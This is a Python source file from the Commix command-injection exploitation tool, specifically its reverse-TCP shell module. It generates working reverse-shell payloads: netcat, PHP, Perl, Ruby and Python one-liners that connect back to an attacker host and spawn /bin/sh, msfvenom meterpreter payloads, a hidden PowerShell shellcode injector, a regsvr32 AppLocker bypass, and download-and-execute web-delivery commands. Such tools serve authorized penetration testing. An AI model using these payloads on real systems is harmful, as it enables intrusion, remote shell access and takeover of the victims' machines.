#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import urllib
import base64
import subprocess
from src.utils import menu
from src.utils import update
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Check for available shell options.
"""
def shell_options(option):
  if option.lower() == "reverse_tcp":
    warn_msg = "You are already into the '" + option.lower() + "' mode."
    print settings.print_warning_msg(warn_msg)
  elif option.lower() == "?": 
    menu.reverse_tcp_options()
  elif option.lower() == "quit": 
    sys.exit(0)
  elif option[0:3].lower() == "set":
    if option[4:9].lower() == "lhost":
      check_lhost(option[10:])
    if option[4:9].lower() == "rhost":
      err_msg =  "The '" + option[4:9].upper() + "' option, is not "
      err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
      print settings.print_error_msg(err_msg)  
    if option[4:9].lower() == "lport":
      check_lport(option[10:])
    if option[4:11].lower() == "srvport":
      check_srvport(option[12:])
    if option[4:11].lower() == "uripath":
      check_uripath(option[12:])
  else:
    return option

# Payload generation message.
def gen_payload_msg(payload):
  info_msg = "Generating the '" + payload + "' shellcode... "
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()

"""
Success msg.
"""
def shell_success():
  success_msg = "Everything is in place, cross your fingers and wait for a shell!\n"
  sys.stdout.write(settings.print_success_msg(success_msg))
  sys.stdout.flush()

"""
Error msg if the attack vector is available only for Windows targets.
"""
def windows_only_attack_vector():
    error_msg = "This attack vector is available only for Windows targets."
    print settings.print_error_msg(error_msg)

"""
Message regarding the MSF handler.
"""
def msf_launch_msg(output):
    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
    print settings.print_info_msg(info_msg)
    info_msg = "Once the loading is done, press here any key to continue..."
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdin.readline().replace("\n","")
    # Remove the ouput file.
    os.remove(output)

"""
Set up the PHP working directory on the target host.
"""
def set_php_working_dir():
  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
      question_msg += "' as PHP working directory on the target host? [Y/n] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      php_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      php_dir = ""
    if len(php_dir) == 0:
       php_dir = "y"
    if php_dir in settings.CHOICE_YES:
      break
    elif php_dir in settings.CHOICE_NO:
      question_msg = "Please provide a custom working directory for PHP (e.g. '" 
      question_msg += settings.WIN_PHP_DIR + "') > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
      settings.USER_DEFINED_PHP_DIR = True
      break
    else:
      err_msg = "'" + php_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass

"""
Set up the Python working directory on the target host.
"""
def set_python_working_dir():
  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
      question_msg += "' as Python working directory on the target host? [Y/n] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      python_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      python_dir = ""
    if len(python_dir) == 0:
       python_dir = "y"
    if python_dir in settings.CHOICE_YES:
      break
    elif python_dir in settings.CHOICE_NO:
      question_msg = "Please provide a custom working directory for Python (e.g. '" 
      question_msg += settings.WIN_PYTHON_DIR + "') > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
      settings.USER_DEFINED_PYTHON_DIR = True
      break
    else:
      err_msg = "'" + python_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass

"""
check / set lhost option for reverse TCP connection
"""
def check_lhost(lhost):
  parts = lhost.split('.')
  if len(parts) == 4 and all(part.isdigit() for part in parts) and all(0 <= int(part) <= 255 for part in parts):
    settings.LHOST = lhost
    print "LHOST => " + settings.LHOST
    return True
  else:
    err_msg = "The provided IP is not in "
    err_msg += "appropriate format (i.e 192.168.1.5)."
    print settings.print_error_msg(err_msg)
    return False

"""
check / set lport option for reverse TCP connection
"""
def check_lport(lport):
  try:  
    if float(lport):
      settings.LPORT = lport
      print "LPORT => " + settings.LPORT
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    print settings.print_error_msg(err_msg)
    return False

"""
check / set srvport option for reverse TCP connection
"""
def check_srvport(srvport):
  try:  
    if float(srvport):
      settings.SRVPORT = srvport
      print "SRVPORT => " + settings.SRVPORT
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    print settings.print_error_msg(err_msg)
    return False

"""
check / set uripath option for reverse TCP connection
"""
def check_uripath(uripath):
  settings.URIPATH = uripath
  print "URIPATH => " + settings.URIPATH
  return True

"""
Set up the netcat reverse TCP connection
"""
def netcat_version():
  
  # Defined shell
  shell = "sh"

  # Netcat alternatives
  NETCAT_ALTERNATIVES = [
    "nc",
    "busybox nc",
    "nc.traditional"
  ]

  while True:
    nc_version = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
    
    # Default Netcat
    if nc_version == '1':
      nc_alternative = NETCAT_ALTERNATIVES[0]
      break
    # Netcat for Busybox
    if nc_version == '2':
      nc_alternative = NETCAT_ALTERNATIVES[1]
      break
    # Netcat-Traditional 
    elif nc_version == '3':
      nc_alternative = NETCAT_ALTERNATIVES[2]
      break
    # Check for available shell options  
    elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(nc_version):
        return shell_options(nc_version)
    # Invalid option    
    else:
      err_msg = "The '" + nc_version + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '/bin' standard subdirectory? [y/N] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      enable_bin_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      enable_bin_dir = ""
    if len(enable_bin_dir) == 0:
       enable_bin_dir = "n"              
    if enable_bin_dir in settings.CHOICE_NO:
      break  
    elif enable_bin_dir in settings.CHOICE_YES :
      nc_alternative = "/bin/" + nc_alternative
      shell = "/bin/" + shell
      break    
    elif enable_bin_dir in settings.CHOICE_QUIT:
      sys.exit(0)
    else:
      err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass

  cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell

  return cmd

"""
Set up other [1] reverse tcp shell connections
[1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
"""
def other_reverse_shells():

  while True:
    other_shell = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like reverse TCP shells""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use the web delivery script. 

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
    # PHP-reverse-shell
    if other_shell == '1':
      other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
                    "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
      break

    # Perl-reverse-shell
    elif other_shell == '2':
      other_shell = "perl -e 'use Socket;" \
                    "$i=\"" + settings.LHOST  + "\";" \
                    "$p=" + settings.LPORT  + ";" \
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
                    "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
                    "exec(\"/bin/sh -i\");};'"
      break

    # Ruby-reverse-shell
    elif other_shell == '3':
      other_shell = "ruby -rsocket -e '" \
                    "c=TCPSocket.new(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
                    "$stdin.reopen(c);" \
                    "$stdout.reopen(c);" \
                    "$stderr.reopen(c);" \
                    "$stdin.each_line{|l|l=l.strip;" \
                    "next if l.length==0;" \
                    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"
      break

    # Python-reverse-shell 
    elif other_shell == '4':
      other_shell = "python -c 'import socket,subprocess,os%0d" \
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                    "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
                    "os.dup2(s.fileno(),0)%0d" \
                    "os.dup2(s.fileno(),1)%0d" \
                    "os.dup2(s.fileno(),2)%0d" \
                    "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
      break

    # PHP-reverse-shell (meterpreter)
    elif other_shell == '5':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      payload = "php/meterpreter/reverse_tcp"
      output = "php_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
          " LHOST=" + str(settings.LHOST) + 
          " LPORT=" + str(settings.LPORT) + 
          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r+") as content_file:
          data = content_file.readlines()
          data = ''.join(data).replace("\n"," ")

        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set lhost " + str(settings.LHOST) + "\n"
                          "set lport " + str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
          set_php_working_dir()
          other_shell = settings.WIN_PHP_DIR + " -r " + data
        else:
          other_shell = "php -r \"" + data + "\""
        msf_launch_msg(output)
      except:
        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
      break

    # Python-reverse-shell (meterpreter)
    elif other_shell == '6':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      payload = "python/meterpreter/reverse_tcp"
      output = "py_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
          " LHOST=" + str(settings.LHOST) + 
          " LPORT=" + str(settings.LPORT) + 
          " -o " + output + ">/dev/null 2>&1", shell=True).wait()
        
        with open (output, "r") as content_file:
          data = content_file.readlines()
          data = ''.join(data)
          data = base64.b64encode(data)

        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set lhost " + str(settings.LHOST) + "\n"
                          "set lport " + str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
          set_python_working_dir()
          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
        else:
          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
        msf_launch_msg(output)
      except:
        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
      break
    
    # Powershell injection attacks
    elif other_shell == '7':
      if not settings.TARGET_OS == "win":
        windows_only_attack_vector()
        continue
      else:
        while True:
          windows_reverse_shell = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe application whitelisting bypass.

commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)

          if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
            if shell_options(windows_reverse_shell):
              return shell_options(windows_reverse_shell)
          elif windows_reverse_shell == '1' :
            output = "powershell_attack.rc"
          elif windows_reverse_shell == '2' :
            output = "powershell_attack.txt"
          elif windows_reverse_shell == '3' :
            output = "regsvr32_applocker_bypass_server.rc"
          else:
            err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
            print settings.print_error_msg(err_msg)
            continue

          if not os.path.exists(settings.METASPLOIT_PATH):
            error_msg = settings.METASPLOIT_ERROR_MSG
            print settings.print_error_msg(error_msg)
            continue

          payload = "windows/meterpreter/reverse_tcp"

          # Shellcode injection with native x86 shellcode
          if windows_reverse_shell == '1':
            gen_payload_msg(payload)
            try:
              proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
              with open(output, 'r') as content_file:
                repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
                shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()), content_file.read()).rstrip()[1:]
              # One line shellcode injection with native x86 shellcode
              # Greetz to Dave Kennedy (@HackingDave)
              powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
              other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
              print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
              with open(output, 'w+') as filewrite:
                filewrite.write("use exploit/multi/handler\n"
                                "set payload " + payload + "\n"
                                "set lhost " + str(settings.LHOST) + "\n"
                                "set lport " + str(settings.LPORT) + "\n"
                                "exploit\n\n")
              msf_launch_msg(output)
            except:
              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
            break

          # TrustedSec's Magic Unicorn (3rd Party)
          elif windows_reverse_shell == '2':
            try:
              current_path = os.getcwd()
              try:
                unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                os.chdir(unicorn_path)
                # Check for Unicorn version.
                with open('unicorn.py') as unicorn_file:
                  for line in unicorn_file:
                    line = line.rstrip()
                    if "Magic Unicorn Attack Vector v" in line:
                      unicorn_version = line.replace("Magic Unicorn Attack Vector v", "").replace(" ", "").replace("-","").replace("\"","").replace(")","")
                      break 
              except:
                unicorn_version = "" 
              update.check_unicorn_version(unicorn_version)
              try:
                if len(unicorn_version) == 0:
                  unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                  os.chdir(unicorn_path)
                gen_payload_msg(payload)
                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                with open(output, 'r') as content_file:
                  other_shell = content_file.read().replace('\n', '')
                other_shell = urllib.quote_plus(other_shell) 
                print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
                # Remove the ouput file
                os.remove(output)
                with open("unicorn.rc", 'w+') as filewrite:
                  filewrite.write("use exploit/multi/handler\n"
                                  "set payload " + payload + "\n"
                                  "set lhost " + str(settings.LHOST) + "\n"
                                  "set lport " + str(settings.LPORT) + "\n"
                                  "exploit\n\n")
                msf_launch_msg("unicorn.rc")
                # Return to the current path.
                os.chdir(current_path)
              except:
                continue 
            except:
              print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
            break

          # Regsvr32.exe application whitelisting bypass
          elif windows_reverse_shell == '3':
            with open(output, 'w+') as filewrite:
              filewrite.write("use exploit/windows/misc/regsvr32_applocker_bypass_server\n"
                              "set payload " + payload + "\n"
                              "set lhost " + str(settings.LHOST) + "\n"
                              "set lport " + str(settings.LPORT) + "\n"
                              "set srvport " + str(settings.SRVPORT) + "\n"
                              "set uripath " + settings.URIPATH + "\n"
                              "exploit\n\n")
            if not settings.TARGET_OS == "win":
              windows_only_attack_vector()
              continue
            else:
              other_shell = "regsvr32 /s /n /u /i:http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH +".sct scrobj.dll"
              msf_launch_msg(output)
              break
      break
    
    # Web delivery script
    elif other_shell == '8':
      while True:
        web_delivery = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meterpreter reverse TCP shell.

commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)

        if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):  
          if shell_options(web_delivery):
            return shell_options(web_delivery)
        elif web_delivery == '1':
          payload = "python/meterpreter/reverse_tcp"
        elif web_delivery == '2':
          payload = "php/meterpreter/reverse_tcp"
        elif web_delivery == '3':
          payload = "windows/meterpreter/reverse_tcp"
        else:
          err_msg = "The '" + web_delivery + "' option, is not valid."  
          print settings.print_error_msg(err_msg)
          continue

        if not os.path.exists(settings.METASPLOIT_PATH):
          error_msg = settings.METASPLOIT_ERROR_MSG
          print settings.print_error_msg(error_msg)
          continue

        if 'payload' in locals():
          output = "web_delivery.rc"
          with open(output, 'w+') as filewrite:
            filewrite.write("use exploit/multi/script/web_delivery\n"
                            "set target " + str(int(web_delivery)-1) + "\n"
                            "set payload " + payload + "\n"
                            "set lhost " + str(settings.LHOST) + "\n"
                            "set lport " + str(settings.LPORT) + "\n"
                            "set srvport " + str(settings.SRVPORT) + "\n"
                            "set uripath " + settings.URIPATH + "\n"
                            "exploit\n\n")

          if web_delivery == '1':
            data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
            data = base64.b64encode(data)
            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
              set_python_working_dir()
              other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
            else:
              other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
            msf_launch_msg(output)
            break
          elif web_delivery == '2':
            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
              set_php_working_dir()
              other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));"
            else:
              other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'));\""
            msf_launch_msg(output)
            break
          elif web_delivery == '3':
            if not settings.TARGET_OS == "win":
              windows_only_attack_vector()
              continue
            else:
              other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
              msf_launch_msg(output)
              break
      break
    # Check for available shell options  
    elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(other_shell):
        return shell_options(other_shell)
    # Invalid option
    else:
      err_msg = "The '" + other_shell + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  return other_shell

"""
Choose type of reverse TCP connection.
"""
def reverse_tcp_options():

  while True:
    reverse_tcp_option = raw_input("""   
---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat reverse TCP shell.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.

commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)

    if reverse_tcp_option.lower() == "reverse_tcp": 
      warn_msg = "You are already into the '" + reverse_tcp_option.lower() + "' mode."
      print settings.print_warning_msg(warn_msg)
      continue

    # Option 1 - Netcat shell
    elif reverse_tcp_option == '1' :
      reverse_tcp_option = netcat_version()
      if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
      elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
        return reverse_tcp_option
      else:
        pass  
    # Option 2 - Other (Netcat-Without-Netcat) shells
    elif reverse_tcp_option == '2' :
      reverse_tcp_option = other_reverse_shells()
      if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
    # Check for available shell options    
    elif any(option in reverse_tcp_option.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(reverse_tcp_option):
        return shell_options(reverse_tcp_option)
    # Invalid option    
    else:
      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  return reverse_tcp_option

"""
Set up the reverse TCP connection
"""
def configure_reverse_tcp():
  # Set up LHOST for the reverse TCP connection
  while True:
    option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
    if option.lower() == "reverse_tcp": 
      warn_msg = "You are already into the '" + option.lower() + "' mode."
      print settings.print_warning_msg(warn_msg)
      continue
    if option.lower() == "?": 
      menu.reverse_tcp_options()
      continue
    if option.lower() == "quit": 
      sys.exit(0)
    elif option.lower() == "os_shell" or option.lower() == "back": 
      settings.REVERSE_TCP = False   
      break 
    elif option.lower() == "bind_tcp":
      settings.BIND_TCP = True
      settings.REVERSE_TCP = False
      break 
    elif len(settings.LPORT) != 0 and len(settings.LHOST) != 0:
      break 
    elif option[0:3].lower() == "set":
      if option[4:9].lower() == "lhost":
        if check_lhost(option[10:]):
          if len(settings.LPORT) == 0:
            pass
          else:
            break
        else:
          continue
      if option[4:9].lower() == "rhost":
        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
        err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
        print settings.print_error_msg(err_msg)  
        continue  
      if option[4:9].lower() == "lport":
        if check_lport(option[10:]):
          if len(settings.LHOST) == 0:
            pass
          else:
            break
        else:
          continue
      if option[4:11].lower() == "srvport":
        check_srvport(option[12:])
      if option[4:11].lower() == "uripath":
        check_uripath(option[12:])
    else:
      err_msg = "The '" + option + "' option, is not valid."
      print settings.print_error_msg(err_msg)
      pass

# eof